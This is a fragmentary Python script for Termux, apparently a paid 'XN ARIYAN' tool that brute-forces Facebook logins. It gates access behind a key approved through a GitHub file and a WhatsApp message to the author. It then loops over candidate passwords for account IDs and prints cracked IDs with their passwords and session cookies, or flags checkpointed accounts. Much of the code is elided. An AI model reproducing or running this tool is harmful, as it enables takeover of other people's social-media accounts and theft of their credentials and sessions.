...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/Ariyan.of.king143')
os.system(f'xdg-open https://www.facebook.com/Ariyan.of.king143')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/ARIYAN-AHMED-143/Aru/blob/main/Approvel.txt').text
...
[] VERSION      :      6.1
[] MESSENGER    :      ARIYAN 𝗧𝗲𝗿𝗺𝘂𝘅 𝗖𝗼𝗺𝗺𝘂𝗻𝗶𝘁𝘆
=================================================="\033[1;23m"""                                
  ...
  try:
    ...
    if id in httpCaht:
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   XN,   ARIYAN,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+01878647518?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
os.system('espeak -a 300 " Welcome,   to,  XN ARIYAN,  PAID,   Tools"')
def back():
	login()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " ARIYAN,  Cp,  Id"')
                ...
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}\033[0;97m•\033[0; 95mARIYAN-OK💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;91m[🌺]= COOKIES • \033[0;91m{kuki} ')
                os.system('espeak -a 300 " ARIYAN,  Ok,  id"')
